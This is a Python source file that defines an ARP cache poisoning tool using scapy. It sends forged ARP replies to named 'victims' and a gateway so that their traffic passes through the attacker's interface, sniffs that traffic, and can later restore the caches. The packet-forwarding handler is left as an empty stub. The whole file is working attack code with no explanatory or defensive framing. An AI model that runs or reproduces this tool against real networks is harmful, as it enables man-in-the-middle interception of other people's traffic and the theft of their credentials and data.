from threading import Thread
from time import sleep
from scapy.all import ARP, Ether, IP, ICMP, sendp, sr
from entities import Host, Interface
from util import Sniffer

class ARPAttack:
    def __init__(self,
            interface: Interface,
            gateway: Host = None,
            victims: list[Host] = [],
            interval: int = 10):

        if gateway is None:
            raise ValueError('There is no gateway selected')
        if len(victims) == 0:
            raise ValueError('There are no victims selected')

        self.interface = interface
        self.gateway = gateway
        self.victims = victims
        self.interval = interval
        self.active = False

    def start(self):
        self.active = True
        # We don't need to keep a reference to this thread because the thread will stop automatically
        Thread(target = self.poison_cache).start()
        self.sniffing_thread = Sniffer(self.interface, self.forward_packet)
        self.sniffing_thread.start()

    def stop(self):
        self.sniffing_thread.join()
        self.repair_cache()
        self.active = False

    def forward_packet(self, packet):
        pass

    def ping(self):
        for victim in self.victims:
            ping = IP() / ICMP()
            ping[IP].src = victim.ip_address
            ping[IP].dst = self.gateway.ip_address
            sr(ping, iface=self.interface.name, timeout=1, verbose=0)

            ping = IP() / ICMP()
            ping[IP].src = self.gateway.ip_address
            ping[IP].dst = victim.ip_address
            sr(ping, iface=self.interface.name, timeout=1, verbose=0)

    def poison_cache(self):
        # The victims and gateway need to know of each others existence before
        # the attack can be performed (or so it seems, at least)
        self.ping()

        while True:
            if not self.active:
                return

            for victim in self.victims:
                packet = Ether() / ARP()
                packet[Ether].src = self.interface.mac_address
                packet[Ether].dst = self.gateway.mac_address
                packet[ARP].psrc = victim.ip_address
                packet[ARP].hwsrc = self.interface.mac_address
                packet[ARP].pdst = self.gateway.ip_address
                packet[ARP].hwdst = self.gateway.mac_address
                packet[ARP].op = 2
                sendp(packet, iface=self.interface.name, verbose=0)

                packet = Ether() / ARP()
                packet[Ether].src = self.interface.mac_address
                packet[Ether].dst = victim.mac_address
                packet[ARP].psrc = self.gateway.ip_address
                packet[ARP].hwsrc = self.interface.mac_address
                packet[ARP].pdst = victim.ip_address
                packet[ARP].hwdst = victim.mac_address
                packet[ARP].op = 2
                sendp(packet, iface=self.interface.name, verbose=0)
            sleep(self.interval)

    def repair_cache(self):
        for victim in self.victims:
            packet = Ether() / ARP()
            packet[Ether].src = self.interface.mac_address
            packet[Ether].dst = self.gateway.mac_address
            packet[ARP].psrc = victim.ip_address
            packet[ARP].hwsrc = victim.mac_address
            packet[ARP].pdst = self.gateway.ip_address
            packet[ARP].hwdst = self.gateway.mac_address
            packet[ARP].op = 2
            sendp(packet, iface=self.interface.name, verbose=0)

            packet = Ether() / ARP()
            packet[Ether].src = self.interface.mac_address
            packet[Ether].dst = victim.mac_address
            packet[ARP].psrc = self.gateway.ip_address
            packet[ARP].hwsrc = self.gateway.mac_address
            packet[ARP].pdst = victim.ip_address
            packet[ARP].hwdst = victim.mac_address
            packet[ARP].op = 2
            sendp(packet, iface=self.interface.name, verbose=0)
